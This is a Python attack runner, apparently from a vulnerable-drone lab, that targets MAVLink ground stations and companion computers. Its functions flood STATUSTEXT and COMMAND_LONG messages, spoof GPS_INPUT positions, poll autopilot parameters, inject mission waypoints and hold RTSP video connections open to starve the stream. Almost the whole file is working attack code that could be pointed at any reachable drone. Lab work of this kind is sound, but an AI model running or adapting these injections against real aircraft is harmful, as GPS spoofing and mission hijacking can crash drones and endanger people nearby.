#!/usr/bin/env python3
import os, sys, json, time, socket, subprocess, math, random
from pathlib import Path

BASE = Path(__file__).resolve().parents[2]  # dvd_lite/dvd_attacks_lpc
OUT_DIR = Path(os.environ.get("OUT_DIR", str(BASE / "bus")))
BUS_LOG = os.environ.get("BUS_LOG", str(OUT_DIR / "bus.log"))

PROFILE = os.environ.get("LPC_PROFILE", str(BASE / "modules/attacks/lpc_profiles/attacks_lpc.json"))

def log_bus(msg: str):
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    with open(BUS_LOG, "a", encoding="utf-8") as f:
        t = time.time()
        f.write(f'[{int(t)}] BUS ATK {msg}\n')

def load_json(p):
    with open(p, "r", encoding="utf-8") as f: return json.load(f)

def resolve(role: str, service: str|None):
    yml = BASE / "modules/attacks/targets/targets.yml"
    cmd = f"python3 {BASE}/modules/attacks/resolve_target.py {yml} {role} {service or ''}".strip()
    j = json.loads(subprocess.check_output(cmd, shell=True, text=True))
    return j["ip"], int(j.get("port") or 0), j["container"]

# ---------------- MAVLink helpers ----------------
def mav_connect(host: str, port: int):
    # pymavlink import는 경량화 위해 늦게
    from pymavlink import mavutil
    m = mavutil.mavlink_connection(f"udpout:{host}:{port}")
    m.wait_heartbeat(timeout=5)
    return m

def mav_send_statustext(m, text: str, pps: int, burst_ms: int, sleep_ms: int, duration_s: int = 10):
    deadline = time.time() + duration_s
    while time.time() < deadline:
        burst_end = time.time() + burst_ms/1000.0
        while time.time() < burst_end:
            m.mav.statustext_send(5, text.encode("utf-8")[:50])
            time.sleep(1.0/max(1,pps))
        time.sleep(sleep_ms/1000.0)

def mav_send_cmdlong(m, cmd: int, params: list[float], pps: int, burst_ms: int, sleep_ms: int, duration_s: int = 10):
    deadline = time.time() + duration_s
    tgt = (m.target_system or 1, m.target_component or 1)
    while time.time() < deadline:
        burst_end = time.time() + burst_ms/1000.0
        while time.time() < burst_end:
            m.mav.command_long_send(tgt[0], tgt[1], int(cmd), 0, *(params+[0]*(7-len(params))))
            time.sleep(1.0/max(1,pps))
        time.sleep(sleep_ms/1000.0)

def _deg_delta_m(d_m):
    # 대략적 위도/경도 변환(라스베가스 근방 기준)
    dlat = d_m / 111_111.0
    dlon = d_m / (111_111.0 * math.cos(math.radians(37.24)))
    return dlat, dlon

def mav_send_gps_input(m, delta_m: float, pps: int, burst_ms: int, sleep_ms: int, duration_s: int = 10):
    # 타입 에러 방지를 위해 정수/실수 명확화
    from pymavlink import mavutil
    lat0 = 37.2418592; lon0 = -115.796917; alt = 120.0
    fix_type = 3
    gps_id = 0
    time_week = 0
    hdop = 0.7; vdop = 0.7
    vn=0.0; ve=0.0; vd=0.0
    speed_acc=0.5; horiz_acc=0.8; vert_acc=1.2
    sats = 10
    ignore_flags = 0   # 실제 필드 무시 안함
    deadline = time.time() + duration_s
    while time.time() < deadline:
        burst_end = time.time() + burst_ms/1000.0
        while time.time() < burst_end:
            t_us = int(time.time()*1_000_000)
            dlat, dlon = _deg_delta_m(delta_m)
            lat = lat0 + (random.random()-0.5)*dlat
            lon = lon0 + (random.random()-0.5)*dlon
            time_week_ms = int((t_us//1000) % (7*24*3600*1000))
            m.mav.gps_input_send(
                t_us,                 # time_usec (uint64)
                int(gps_id),          # gps_id (uint8)
                int(ignore_flags),    # ignore_flags (uint16)
                int(time_week_ms),    # time_week_ms (uint32)
                int(time_week),       # time_week (uint16)
                int(fix_type),        # fix_type (uint8)
                float(lat), float(lon), float(alt),   # lat, lon, alt (double->float ok)
                float(hdop), float(vdop),
                float(vn), float(ve), float(vd),
                float(speed_acc), float(horiz_acc), float(vert_acc),
                int(sats)
            )
            time.sleep(1.0/max(1,pps))
        time.sleep(sleep_ms/1000.0)

def mav_param_poll(m, names: list[str], count: int, interval_s: float):
    # '*' 이면 알아낸 모든 파라미터 중 랜덤 샘플
    if names == ["*"]:
        # 요청 스트림 생성(간단 구현: 흔한 이름들)
        names = ["SYSID_THISMAV","ARMING_CHECK","FENCE_ENABLE","EK3_ENABLE","LOIT_SPEED","ATC_ANG_RLL_P","ATC_ANG_PIT_P"]
    for i in range(count):
        nm = names[i % len(names)]
        m.mav.param_request_read_send(m.target_system or 1, m.target_component or 1, nm.encode('ascii','ignore')[:16], -1)
        time.sleep(max(0.05, interval_s))

# ---------------- RTSP/HTTP helpers ----------------
def rtsp_slowpull(host: str, port: int, requests: int, think_ms: int):
    # 헤더만 끊임없이 걸기(간단화된 RTSP OPTIONS/DESCRIBE 시퀀스)
    addr = (host, port)
    for i in range(requests):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
        try:
            s.connect(addr)
            s.sendall(b"OPTIONS rtsp://%s:%d/stream RTSP/1.0\r\nCSeq: 1\r\n\r\n" % (host.encode(), port))
            time.sleep(think_ms/1000.0)
        except Exception:
            pass
        finally:
            try: s.close()
            except: pass

# ---------------- registry ----------------
def run_attack(attack_key: str, level: str, duration_s: int = 12):
    prof = load_json(PROFILE)["attacks"][attack_key]
    engine = prof["engine"]
    params = prof["levels"][level]
    # 대상 해석
    role = "gcs" if "mavlink" in engine or "mavlink" in prof.get("message","").lower() else ("companion" if "rtsp" in engine else "gcs")
    service = "mavlink" if "mavlink" in engine or "mavlink" in prof.get("message","").lower() else ("rtsp" if "rtsp" in engine else "")
    host, port, cname = resolve(role, service or None)

    log_bus(f"ATTACK_START key={attack_key} level={level} role={role} host={host} port={port} BASE={BASE}")

    if engine == "mavlink_inject":
        m = mav_connect(host, port)
        if prof.get("message") == "STATUSTEXT":
            mav_send_statustext(m, params.get("text","dbg"), params["pps"], params["burst_ms"], params["sleep_ms"], duration_s)
        elif prof.get("message") == "COMMAND_LONG":
            mav_send_cmdlong(m, prof.get("command",511), prof.get("params",[0]*7), params["pps"], params["burst_ms"], params["sleep_ms"], duration_s)
        elif prof.get("message") == "GPS_INPUT":
            mav_send_gps_input(m, params.get("delta_m",2.0), params["pps"], params["burst_ms"], params["sleep_ms"], duration_s)
    elif engine == "mavlink_param_poll":
        m = mav_connect(host, port)
        mav_param_poll(m, params.get("names",["SYSID_THISMAV"]), params["count"], params["interval_s"])
    elif engine == "mavlink_mission_trickle":
        m = mav_connect(host, port)
        items = params["items"]; itv = params["interval_s"]
        for k in range(items):
            m.mav.mission_item_send(m.target_system or 1, m.target_component or 1, k, 0, 16, 0, 1, 0, 0, 0, 37.2418 + k*1e-4, -115.7969 + k*1e-4, 120.0)
            time.sleep(itv)
    elif engine == "rtsp_slowpull":
        rtsp_slowpull(host, port, params["requests"], params["think_ms"])
    elif engine == "telemetry_siphon":
        # 저강도 수집(모의): UDP 소켓 열고 제한된 recv
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("0.0.0.0", 0))
        time.sleep(params.get("duration_s", 15))
        s.close()

    log_bus(f"ATTACK_END key={attack_key} level={level} role={role}")

def main():
    if len(sys.argv) < 3:
        print("usage: lpc_runner.py <attack_key> <level(low|mid|high)> [duration_s]"); sys.exit(2)
    attack_key, level = sys.argv[1], sys.argv[2]
    dur = int(sys.argv[3]) if len(sys.argv)>3 else 12
    run_attack(attack_key, level, dur)

if __name__ == "__main__": main()
